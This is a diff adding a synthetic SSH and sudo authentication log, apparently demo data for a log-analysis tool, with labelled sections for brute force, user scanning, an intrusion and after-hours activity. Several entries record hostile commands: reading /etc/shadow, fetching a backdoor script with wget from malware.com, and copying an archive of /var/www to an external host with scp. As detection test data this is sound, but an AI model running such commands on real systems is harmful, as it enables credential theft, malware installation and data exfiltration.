@@ -1,0 +1,64 @@
+# Log Sentinel v2.0 - SSH/Auth Log de Demonstração
+# Simula atividade de autenticação num servidor Linux
+
+Jan 31 08:00:01 server sshd[1001]: Accepted publickey for admin from 192.168.1.5 port 52341 ssh2
+Jan 31 08:05:22 server sshd[1002]: Accepted password for developer from 192.168.1.10 port 52342 ssh2
+Jan 31 08:10:33 server sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/ls /var/log
+Jan 31 08:15:44 server sshd[1003]: session opened for user developer by (uid=0)
+
+# === BRUTE FORCE ATTACK ===
+Jan 31 09:00:01 server sshd[2001]: Failed password for admin from 10.0.0.50 port 22 ssh2
+Jan 31 09:00:02 server sshd[2002]: Failed password for admin from 10.0.0.50 port 22 ssh2
+Jan 31 09:00:03 server sshd[2003]: Failed password for admin from 10.0.0.50 port 22 ssh2
+Jan 31 09:00:04 server sshd[2004]: Failed password for admin from 10.0.0.50 port 22 ssh2
+Jan 31 09:00:05 server sshd[2005]: Failed password for admin from 10.0.0.50 port 22 ssh2
+Jan 31 09:00:06 server sshd[2006]: Failed password for admin from 10.0.0.50 port 22 ssh2
+Jan 31 09:00:07 server sshd[2007]: Failed password for admin from 10.0.0.50 port 22 ssh2
+Jan 31 09:00:08 server sshd[2008]: Failed password for admin from 10.0.0.50 port 22 ssh2
+Jan 31 09:00:09 server sshd[2009]: Failed password for admin from 10.0.0.50 port 22 ssh2
+Jan 31 09:00:10 server sshd[2010]: Failed password for admin from 10.0.0.50 port 22 ssh2
+
+# === INVALID USERS (Scanning) ===
+Jan 31 09:10:01 server sshd[2101]: Invalid user root from 10.0.0.51 port 22
+Jan 31 09:10:02 server sshd[2102]: Failed password for invalid user root from 10.0.0.51 port 22 ssh2
+Jan 31 09:10:03 server sshd[2103]: Invalid user test from 10.0.0.51 port 22
+Jan 31 09:10:04 server sshd[2104]: Failed password for invalid user test from 10.0.0.51 port 22 ssh2
+Jan 31 09:10:05 server sshd[2105]: Invalid user guest from 10.0.0.51 port 22
+Jan 31 09:10:06 server sshd[2106]: Failed password for invalid user guest from 10.0.0.51 port 22 ssh2
+Jan 31 09:10:07 server sshd[2107]: Invalid user oracle from 10.0.0.51 port 22
+Jan 31 09:10:08 server sshd[2108]: Invalid user mysql from 10.0.0.51 port 22
+Jan 31 09:10:09 server sshd[2109]: Invalid user postgres from 10.0.0.51 port 22
+
+# === SUCCESSFUL INTRUSION AFTER BRUTE FORCE ===
+Jan 31 09:15:01 server sshd[2201]: Accepted password for admin from 10.0.0.50 port 22 ssh2
+Jan 31 09:15:05 server sudo: admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jan 31 09:15:10 server sudo: admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://malware.com/backdoor.sh
+Jan 31 09:15:15 server sudo: admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x backdoor.sh
+
+# === PRIVILEGE ESCALATION ATTEMPT ===
+Jan 31 10:00:01 server sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/su -
+Jan 31 10:00:05 server sudo: developer : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/su -
+Jan 31 10:00:10 server sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/cat /etc/sudoers
+
+# === NORMAL ACTIVITY ===
+Jan 31 11:00:01 server sshd[3001]: Accepted publickey for backup from 192.168.1.100 port 52500 ssh2
+Jan 31 11:30:02 server sshd[3002]: session closed for user backup
+Jan 31 12:00:03 server sshd[3003]: Accepted password for admin from 192.168.1.5 port 52501 ssh2
+Jan 31 12:30:04 server sudo: admin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/bin/tail -f /var/log/syslog
+
+# === ANOTHER BRUTE FORCE FROM DIFFERENT IP ===
+Jan 31 14:00:01 server sshd[4001]: Failed password for root from 172.16.0.100 port 22 ssh2
+Jan 31 14:00:02 server sshd[4002]: Failed password for root from 172.16.0.100 port 22 ssh2
+Jan 31 14:00:03 server sshd[4003]: Failed password for root from 172.16.0.100 port 22 ssh2
+Jan 31 14:00:04 server sshd[4004]: Failed password for root from 172.16.0.100 port 22 ssh2
+Jan 31 14:00:05 server sshd[4005]: Failed password for root from 172.16.0.100 port 22 ssh2
+Jan 31 14:00:06 server sshd[4006]: Failed password for root from 172.16.0.100 port 22 ssh2
+
+# === LATE NIGHT SUSPICIOUS ACTIVITY (Anomalous Time) ===
+Jan 31 02:30:01 server sshd[5001]: Accepted password for admin from 203.0.113.50 port 22 ssh2
+Jan 31 02:30:10 server sudo: admin : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/tar czf /tmp/data.tar.gz /var/www
+Jan 31 02:31:00 server sudo: admin : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /tmp/data.tar.gz user@external.com:/backup
+
+# === END OF DAY ===
+Jan 31 18:00:01 server sshd[6001]: session closed for user admin
+Jan 31 18:00:02 server sshd[6002]: session closed for user developer
